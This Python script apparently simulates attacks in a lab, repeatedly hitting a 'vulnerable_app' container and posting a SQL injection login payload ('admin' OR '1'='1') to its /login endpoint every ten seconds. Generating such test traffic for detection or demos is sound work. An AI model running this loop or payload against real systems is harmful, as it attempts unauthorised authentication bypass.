import os
import time
import requests
from datetime import datetime

TARGET_URL = os.getenv("TARGET_URL", "http://vulnerable_app:5000")


def log(msg: str):
    print(f"[{datetime.utcnow().isoformat()}] {msg}", flush=True)


def run_attack_loop():
    while True:
        try:
            # 1. Visit homepage
            r1 = requests.get(TARGET_URL, timeout=2.0)
            log(f"Visited / -> status {r1.status_code}")

            # 2. Try a 'suspicious' login
            login_url = TARGET_URL + "/login"
            payload = {
                "username": "admin' OR '1'='1",
                "password": "anything"
            }
            r2 = requests.post(login_url, data=payload, timeout=2.0)
            log(f"Posted to /login -> status {r2.status_code}")

        except Exception as e:
            log(f"Error attacking target: {e}")

        # Sleep between attack rounds
        time.sleep(10)


if __name__ == "__main__":
    log(f"Starting attack loop against {TARGET_URL}")
    run_attack_loop()
